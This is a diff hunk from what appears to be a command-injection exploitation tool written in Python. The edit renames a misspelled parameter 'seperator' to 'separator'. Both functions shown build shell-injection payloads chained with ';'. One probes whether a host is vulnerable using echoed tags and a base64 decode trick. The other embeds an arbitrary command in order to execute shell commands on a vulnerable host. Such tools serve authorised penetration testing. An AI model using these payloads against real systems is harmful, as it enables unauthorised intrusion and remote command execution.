@@ -20,26 +20,26 @@
 """
 
 # Eval-based decision payload (check if host is vulnerable).
-def decision(seperator,TAG, B64_ENC_TAG, B64_DEC_TRICK):
-  if seperator == ";":
-    payload = (seperator + "echo '" + TAG + "'" +
-		seperator + "echo `" + "echo " + B64_ENC_TAG + B64_DEC_TRICK + "`" +
-		seperator + "echo '" + TAG + "'" +
-		seperator
+def decision(separator,TAG, B64_ENC_TAG, B64_DEC_TRICK):
+  if separator == ";":
+    payload = (separator + "echo '" + TAG + "'" +
+		separator + "echo `" + "echo " + B64_ENC_TAG + B64_DEC_TRICK + "`" +
+		separator + "echo '" + TAG + "'" +
+		separator
 	      )
   else:
     pass
   return payload
 
 # Execute shell commands on vulnerable host.
-def cmd_execution(seperator,TAG,cmd):
-  if seperator == ";" :
-    payload = (seperator + "echo '" + TAG + "'" +
-	      seperator + "echo `" + "echo " + TAG + "`" +
-	      seperator + "echo `" + cmd + "`" +
-	      seperator + "echo `" + "echo " + TAG + "`" +
-	      seperator + "echo '" + TAG + "'" +
-	      seperator
+def cmd_execution(separator,TAG,cmd):
+  if separator == ";" :
+    payload = (separator + "echo '" + TAG + "'" +
+	      separator + "echo `" + "echo " + TAG + "`" +
+	      separator + "echo `" + cmd + "`" +
+	      separator + "echo `" + "echo " + TAG + "`" +
+	      separator + "echo '" + TAG + "'" +
+	      separator
 	      )
   else:
     pass
